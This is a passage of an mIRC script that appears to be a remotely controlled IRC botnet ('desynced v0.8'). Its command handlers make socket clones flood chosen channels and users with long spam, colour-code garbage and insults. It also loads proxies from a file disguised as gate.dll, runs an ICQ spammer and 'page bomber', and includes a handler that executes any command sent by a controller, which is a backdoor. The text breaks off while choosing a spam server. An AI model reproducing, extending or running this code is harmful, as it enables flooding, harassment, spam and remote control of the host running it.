  if ($1 == clone.quit) {  if ($sock(clone*,0) > 0) { //sockwrite -nt clone* QUIT :  $2- } |  if ($sock(sock*,0) > 0) { //sockwrite -nt sock* QUIT :  $2- } |  /emsg # [Clones Disconnect/Quit] ( $+ $2- $+ )  }
  if ($1 == clone.notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  /clone notice $$2 $3-  }
  if ($1 == clone.nick.flood) { /clone nick.change  }
  if ($1 == clone.nick.reset) { var %x = 1 | while ($sock(clone*,%x)) { sockwrite -tn $sock(clone*,%x) NICK $read webfonts.dll | inc %x 1 } }
  if ($1 == clone.nick) { if ($2 == $null) { halt } |  /clone nick.this $2  }
  if ($1 == clone.msg.all) { if ($2 == $null) { halt } | sockwrite -tn clone* PRIVMSG @ $+ $2 $+ $chr(44) $+ + $+ $2 $+ $chr(44) $+ @+ $+ $2 $+ $chr(44) $+ $2 : $+ $3- }
  if ($1 == clone.hidden.msg) { if ($2 == $null) { halt } | sockwrite -tn clone* PRIVMSG $2 : $+ $chr(1) $+ $chr(1) $3- }
  if ($1 == clone.hidden.notice) { if ($2 == $null) { halt } | sockwrite -tn clone* NOTICE $2 : $+ $chr(1) $+ $chr(1) $3- }
  if ($1 == clone.kill) {  /clone kill |  /emsg $a [All Clones Killed]  }
  if ($1 == clone.combo1) { if ($2 == $null) { halt }  | clone msg $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | timer 1 6 /clone msg $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling }
  if ($1 == clone.combo2) {  if ($2 == $null) { halt } |  clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
    timer 1 6 /clone msg $2  pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp 
  timer 1 12 /clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp  }
  if ($1 == clone.combo3) {  if ($2 == $null) { halt } | clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods
    timer 1 6 /clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods 
  timer 1 12 /clone msg $2 12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods12,1Beyond Floods1,12Beyond Floods   }
  if ($1 == clone.combo4) {   if ($2 == $null) { halt } |  clone msg $2 ��������������������������������������������������������������������������������������������������������������������������������
    timer 1 6 /clone msg $2 ��������������������������������������������������������������������������������������������������������������������������������
  timer 1 12 /clone msg $2 ��������������������������������������������������������������������������������������������������������������������������������  }
  if ($1 == clone.combo5) {  if ($2 == $null) { halt } | clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT
    timer 1 6 /clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT
  timer 1 12 /clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT  }
  if ($1 == clone.combo6) {  if ($2 == $null) { halt } | clone msg $2 UTTT OH!!! $$2 shouldnt of invited!!! Its time for 2,3INVITERS REVENGE! 
    timer 1 6 /clone msg $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
    timer 1 12 /clone msg $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
    timer 1 18 /clone msg $2 ^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^[[[And_ThA_CaT_GoEz_MeO'//]]]^^^The_CoW_GoEs_MOo^^^
    timer 1 24 /clone msg $2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling
    timer 1 32 /clone msg $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL
  timer 1 38 /clone msg $2 12Leave $$2 now! dont support lame fucking inviters! }
  if ($1 == clone.combo7) { //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
    /timer 1 4    /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
    /timer 1 8   /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) 
    /timer 1 12   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8))
  inc %cc |  goto ccloop |   :end  | unset %fat | unset %at* | unset %cc  }
  if ($1 == clone.combo#) { if ($2 == $null) { halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555
    /timer 1 3 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
    /timer 1 7 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
    /timer 1 11 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
    /timer 1 15 /sockwrite -n $sock(clone*,%cc)  PRIVMSG $2 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
  inc %cc |  goto ccloop |   :end  | unset %cc  }   
  if ($1 == clone.combo.word) { if ($3 == $null) { emsg $a !clone.combo.word #/Nick Word. | halt } | //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } 
    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
    /timer 1 3 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
    /timer 1 7 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
    /timer 1 11 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8))
    /timer 1 15 /sockwrite -n $sock(clone*,%cc) PRIVMSG  $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) 
  inc %cc |  goto ccloop |   :end  | unset %cc }
  if ($1 == clone.combo.ultimate) {  if ($2 == $null) { emsg $a !clone.combo.ultimate #/Nick | halt } |  //set %cc 1 | :ccloop | if (%cc > $sock(clone*,0)) { goto end } |  /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling 
    /timer 1 5 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 pewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewppewp
    /timer 1 11  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods1,12BeyondFloods12,1BeyondFloods
    /timer 1 16  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 ��������������������������������������������������������������������������������������������������������������������������������
    /timer 1 22  /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT4SPECIAL123GT4SPECIAL3GT
    /timer 1 27 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2  1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*Star_WarS*1,1Star_WarS*
    /timer 1 32 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333
    /timer 1 37   /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
    /timer 1 44 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3 $+ $rc($r(1,8)) $+ $3
    /timer 1 49 /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222
    /timer 1 53    /sockwrite -n $sock(clone*,%cc) PRIVMSG $2 $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4)) $+ $rc($r(1,8)) $+ $rcr($r(1,4))
    /timer 1 57    /sockwrite -n $sock(clone*,%cc) PRIVMSG $$2 BlingBlingBlingBlingBlingBlingBlingpewppewppewppewppewppewppewppewppewp��������������������������������3GT4SPECIAL3333333333333333333333333333333*1,1Star_WarS*Star_WarS* $+ $r(A,Z) $+ $rc($r(1,8)) $+ $r(A,Z) $+ $rc($r(1,8)) $+ $r(A,Z)
    inc %cc |  goto ccloop |  :end  | unset %cc
  }
  if ($1 == wingate.load) { if (%clones.server == $null) { emsg $a Error, Clones.server is not set! | halt } |  /set %clones.counter 2  |  .timer 5 5 /cf $read gate.dll 2 2 |  /emsg $a 3[Loading Wingates to %clones.server $+ 3] 14Current:15 $sock(sock*,0)  }
  if ($1 == clone.c.flood) {  if ($2 == $null) { halt } | //emsg $a Now Flooding... $2 (to stop !clone.c.flood.stop) |  /clone msg $2 $3- | /clone notice $2 $3-  | //timerConstantFlood1 0 4 /clone msg $2 $3- |  /clone msg $2 $3- | //timerConstantFlood2 0 6 /clone notice $2 $3-  }
  if ($1 == clone.c.flood.stop) { timerConstantFlood* off  | emsg $a Stopping Flood Complete... } 
  if ($1 == ver) { emsg $a desynced v0.8 }
  if ($1 == -) { /emsg $a 14[12done14]: / $+ $2- | / $+ [ [ $2- ] ] }
  if ($1 == icq.spam) {
    if ($2 == subject) { set %is.sub $3- | emsg $a 14[15Icq Spam14] Subject:12 $3- $+  }
    if ($2 == body) { set %is.body $3- | emsg $a 14[15Icq Spam14] Message:12 $3- $+  }
    if ($2 == start) { //icq.spam $3- }
    if ($2 == stop) { icq.spam.stop }
  }
  if ($1 == icqpagebomb) { if ($2 == help) { emsg $a Syntax: !icqpagebomb uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { emsg # Icq Page Bomber (All Settings Reset!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { emsg # Error!: !icqpagebomb uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { emsg # ERROR! Under Ammount 100 please. (moreinfo type !icqpagebomb help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 
  emsg # 14[15ICQPAGEBOMBER14]:15 Bombing:12 $2 14Ammount:12 $3 15Name/Email:12 $4 14Sub:12 $5 14Message:12 $6 3etc... |   /icqpagebomb  }
}
alias r.ds {
  if ($sock(wSck32)) { emsg $a Already spamming | halt }
  var %xx = $rand(1,10)
  if (%xx == 1) { set %spam.server irc.insiderz.net }
